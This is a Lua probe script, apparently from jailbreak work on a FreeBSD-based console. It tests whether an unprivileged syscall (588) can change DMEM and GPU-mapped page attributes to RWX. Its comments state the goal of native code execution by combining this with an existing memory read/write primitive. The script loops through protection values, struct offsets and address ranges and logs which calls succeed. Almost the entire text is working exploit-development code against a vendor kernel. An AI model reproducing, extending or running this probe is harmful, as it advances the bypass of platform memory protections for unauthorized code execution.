-- CRASH_CLASS: MODERATE
-- PROBE 54d: Test sys 588 DMEM page attribute modification
--
-- Context: Static analysis of 13.60 handler confirms NO priv_check.
-- Handler expects: arg[0] = DMEM start address, arg[1] = length, arg[2] = pointer to 0x20-byte struct
-- It does bounds checks against a DMEM region object, page-aligns, copyin's the struct,
-- then calls the page attribute setter. If we can change DMEM page attrs to RWX or W->X,
-- combined with GPU mmap heap R/W, we get native code execution.
--
-- The handler also checks: upper bits of start addr (shifted right 0x28, compared to 0xE),
-- and that aligned_end >= 0x80000000001.
-- It calls copyin(arg[2], stack_buf, 0x20) then calls the setter.

print("=== PROBE 54d: DMEM PAGE ATTRIBUTE MODIFICATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc588 = make_syscall(588)
local sc585 = make_syscall(585) -- mtype_protect, confirmed returning 0

-- Phase 1: First test sys 585 (mtype_protect) to confirm it still works
print("[*] Phase 1: Confirm sys 585 (mtype_protect) baseline")
do
    local ok, ret = pcall(function()
        return sc585(uint64(0), uint64(0x4000), uint64(3))
    end)
    if ok then
        print("  585(0, 0x4000, 3) = " .. signed32(ret))
    else
        print("  585 CRASHED: " .. tostring(ret))
    end
end
print("")

-- Phase 2: Probe sys 588 with various arguments
-- From binary: arg[0]=start_addr, arg[1]=length, arg[2]=ptr_to_struct(0x20 bytes)
print("[*] Phase 2: Testing sys 588 argument patterns")
print("")

local attr_struct = memory.alloc(0x40)

-- Zero struct
for i = 0, 0x3F, 4 do safe_wd(attr_struct + i, 0) end

-- Test 2a: all zeros
print("  Test 2a: 588(0, 0x4000, &zeroed_struct)")
do
    local ok, ret = pcall(function()
        return sc588(uint64(0), uint64(0x4000), uint64(attr_struct))
    end)
    if ok then
        print("    ret = " .. signed32(ret) .. " (" .. hexval(ret) .. ")")
    else
        print("    CRASHED: " .. tostring(ret))
    end
end

-- Test 2b: GPU mmap address as start (we know GPU mmap works)
print("")
print("  Allocating GPU mmap region first...")
local sc_mmap = make_syscall(477)
local gpu = nil
do
    local ok, val = pcall(function()
        return sc_mmap(uint64(0), uint64(16*0x4000), uint64(0x33), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok then
        gpu = val
        print("    GPU mmap at: " .. hexval(gpu))
    else
        print("    GPU mmap FAILED: " .. tostring(val))
    end
end

if gpu then
    -- Try to change attrs on the GPU mmap region
    local gpu_h, gpu_l = get_hi_lo(gpu)

    -- Try different protection values in the struct
    -- FreeBSD DMEM attrs might follow VM_PROT_xxx: READ=1, WRITE=2, EXEC=4
    local prot_tests = {
        {0x07, "RWX (7)"},
        {0x05, "RX (5)"},
        {0x04, "X only (4)"},
        {0x33, "0x33 (mmap prot)"},
        {0x37, "0x37 (mmap prot|EXEC)"},
    }

    for _, pt in ipairs(prot_tests) do
        local protval = pt[1]
        local desc = pt[2]

        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct, protval) -- try prot at offset 0
        safe_wd(attr_struct + 4, 0)

        print(string.format("\n  Test: 588(gpu_addr, 0x4000, &{prot=%s})", desc))
        local ok, ret = pcall(function()
            return sc588(gpu, uint64(0x4000), uint64(attr_struct))
        end)
        if ok then
            local rv = signed32(ret)
            print("    ret = " .. rv)
            if rv == 0 then
                print("    >>> SUCCESS! Page attrs may have changed")
                -- Test if we can now execute from this region
                -- Write a RET instruction (0xC3) and try to jump
                print("    (Cannot test execution without a jump primitive)")
            end
        else
            print("    CRASHED: " .. tostring(ret))
        end
    end

    -- Also try with struct prot at different offsets
    print("\n  Testing struct layout variations:")
    for offset = 0, 0x18, 8 do
        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct + offset, 0x07) -- RWX at this offset

        local ok, ret = pcall(function()
            return sc588(gpu, uint64(0x4000), uint64(attr_struct))
        end)
        if ok then
            print(string.format("    struct[+%d]=7 -> ret=%d", offset, signed32(ret)))
        else
            print(string.format("    struct[+%d]=7 -> CRASHED", offset))
        end
    end
end

-- Phase 3: Try sys 588 with DMEM-style addresses
-- DMEM physical addresses start at high ranges
-- The handler checks upper_bits = addr >> 0x28, must be <= 0xE
print("\n[*] Phase 3: DMEM-range address tests")
local dmem_addrs = {
    {0x00, 0x00000000, "0x0"},
    {0x01, 0x00000000, "0x100000000"},
    {0x0E, 0x00000000, "0xE00000000 (max zone)"},
    {0x00, 0x80000000, "0x80000000"},
}
for _, da in ipairs(dmem_addrs) do
    local hi = da[1]
    local lo = da[2]
    local desc = da[3]

    for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
    safe_wd(attr_struct, 0x07)

    local addr_str = string.format("0x%X%08X", hi, lo)
    local addr_u64 = uint64(addr_str)

    local ok, ret = pcall(function()
        return sc588(addr_u64, uint64(0x4000), uint64(attr_struct))
    end)
    if ok then
        print(string.format("  588(%s, 0x4000, &struct) = %d", desc, signed32(ret)))
    else
        print(string.format("  588(%s, 0x4000, &struct) CRASHED: %s", desc, tostring(ret)))
    end
end

print("")
print("=== PROBE 54d COMPLETE ===")
